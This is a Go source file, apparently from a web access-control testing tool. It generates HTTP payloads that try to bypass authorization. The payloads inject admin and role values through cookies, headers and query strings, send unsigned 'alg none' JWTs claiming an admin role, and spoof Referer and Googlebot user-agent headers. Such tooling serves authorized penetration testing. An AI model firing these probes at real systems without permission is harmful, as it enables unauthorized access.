package techniques

import (
	"fmt"
	"strings"
)

func (SMT) Name() string { return "smt" }

type SMT struct{}

func (SMT) Generate(ctx Context) []Payload {
	var out []Payload

	// State Machine Testing - probe different application states
	// These techniques target stateful access control

	// Session state manipulation
	sessionStates := []string{
		"admin=true",
		"role=admin",
		"privilege=escalated",
		"authenticated=1",
		"user_level=99",
		"is_admin=yes",
		"access_level=full",
		"permission_level=admin",
	}

	for _, state := range sessionStates {
		// Cookie-based
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: "Cookie: " + state,
			Detail:      "Session state via cookie",
			Headers:     map[string]string{"Cookie": state},
			Technique:   "smt",
		})

		// Header-based
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: "X-Session: " + state,
			Detail:      "Session state via header",
			Headers:     map[string]string{"X-Session": state},
			Technique:   "smt",
		})

		// Query parameter
		q := ctx.Target + "?" + state
		out = append(out, Payload{
			Method:      "GET",
			URL:         q,
			Description: "Query: " + state,
			Detail:      "Session state via query",
			Technique:   "smt",
		})
	}

	// JWT manipulation attempts
	jwtPayloads := []string{
		"eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.", // None algorithm
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.signature",
	}

	for _, jwt := range jwtPayloads {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: "JWT: " + jwt[:20] + "...",
			Detail:      "JWT manipulation attempt",
			Headers:     map[string]string{"Authorization": "Bearer " + jwt},
			Technique:   "smt",
		})
	}

	// Timing-based state probing
	timingStates := []string{
		"sleep=0",
		"delay=0",
		"timeout=0",
	}

	for _, ts := range timingStates {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target + "?" + ts,
			Description: "Timing state: " + ts,
			Detail:      "Timing-based state probe",
			Technique:   "smt",
		})
	}

	// Concurrent request states
	out = append(out, Payload{
		Method:      "GET",
		URL:         ctx.Target,
		Description: "Race condition probe",
		Detail:      "Race condition via custom header",
		Headers:     map[string]string{"X-Race-Condition": "true"},
		Technique:   "smt",
	})

	// Referer state manipulation
	referers := []string{
		ctx.Target + "/admin",
		ctx.Target + "/login",
		"https://internal.company.com/admin",
	}

	for _, ref := range referers {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: "Referer: " + ref,
			Detail:      "Referer-based state",
			Headers:     map[string]string{"Referer": ref},
			Technique:   "smt",
		})
	}

	// Browser state simulation
	userAgents := []string{
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	}

	for _, ua := range userAgents {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: "UA: " + strings.Split(ua, " ")[1],
			Detail:      "Browser state simulation",
			Headers:     map[string]string{"User-Agent": ua},
			Technique:   "smt",
		})
	}

	// Cookie prefix attacks
	cookiePrefixes := []string{
		"__Secure-",
		"__Host-",
	}

	for _, prefix := range cookiePrefixes {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: "Cookie prefix: " + prefix,
			Detail:      "Cookie prefix manipulation",
			Headers:     map[string]string{"Cookie": prefix + "session=admin"},
			Technique:   "smt",
		})
	}

	// HTTP state method transitions
	for i := 0; i < 3; i++ {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: fmt.Sprintf("State iteration %d", i),
			Detail:      fmt.Sprintf("State machine iteration %d", i),
			Headers:     map[string]string{"X-State-Iteration": fmt.Sprintf("%d", i)},
			Technique:   "smt",
		})
	}

	return out
}
